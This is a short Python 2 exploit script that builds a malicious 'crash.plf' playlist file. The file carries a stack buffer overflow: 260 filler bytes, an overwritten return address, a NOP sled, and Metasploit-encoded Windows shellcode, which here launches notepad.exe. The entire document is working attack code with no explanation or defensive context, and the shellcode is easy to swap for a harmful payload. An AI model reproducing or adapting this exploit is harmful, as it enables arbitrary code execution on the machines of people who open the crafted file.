import struct

filename = "crash.plf"
junk = "A"*260
eip = struct.pack('<I', 0x76b43ae0)
prependesp = "XXXXXXXXXXXXXXXX"
shellcode = "\x90"*25

# msfpayload windows/exec CMD=notepad.exe | msfencode -a x86 -b '\x0a\x01' -t c
#### For notepad.exe ##############################################################
shellcode += ("\xb8\xda\xd6\x36\x82\xdb\xdf\xd9\x74\x24\xf4\x5a\x29\xc9\xb1"
"\x32\x83\xc2\x04\x31\x42\x11\x03\x42\x11\xe2\x2f\x2a\xde\x0b"
"\xcf\xd3\x1f\x6c\x46\x36\x2e\xbe\x3c\x32\x03\x0e\x37\x16\xa8"
"\xe5\x15\x83\x3b\x8b\xb1\xa4\x8c\x26\xe7\x8b\x0d\x87\x27\x47"
"\xcd\x89\xdb\x9a\x02\x6a\xe2\x54\x57\x6b\x23\x88\x98\x39\xfc"
"\xc6\x0b\xae\x89\x9b\x97\xcf\x5d\x90\xa8\xb7\xd8\x67\x5c\x02"
"\xe3\xb7\xcd\x19\xab\x2f\x65\x45\x0b\x51\xaa\x95\x77\x18\xc7"
"\x6e\x0c\x9b\x01\xbf\xed\xad\x6d\x6c\xd0\x01\x60\x6c\x15\xa5"
"\x9b\x1b\x6d\xd5\x26\x1c\xb6\xa7\xfc\xa9\x2a\x0f\x76\x09\x8e"
"\xb1\x5b\xcc\x45\xbd\x10\x9a\x01\xa2\xa7\x4f\x3a\xde\x2c\x6e"
"\xec\x56\x76\x55\x28\x32\x2c\xf4\x69\x9e\x83\x09\x69\x46\x7b"
"\xac\xe2\x65\x68\xd6\xa9\xe3\x6f\x5a\xd4\x4d\x6f\x64\xd6\xfd"
"\x18\x55\x5d\x92\x5f\x6a\xb4\xd6\x90\x20\x94\x7f\x39\xed\x4d"
"\xc2\x24\x0e\xb8\x01\x51\x8d\x48\xfa\xa6\x8d\x39\xff\xe3\x09"
"\xd2\x8d\x7c\xfc\xd4\x22\x7c\xd5\xba\xab\xf6\xb3\x32\x55\x93"
"\x3b")
################################################################################

fopen = open(filename, 'wb')
fopen.write(junk+eip+prependesp+shellcode)
fopen.close()

print "{} created successfully!!".format(filename)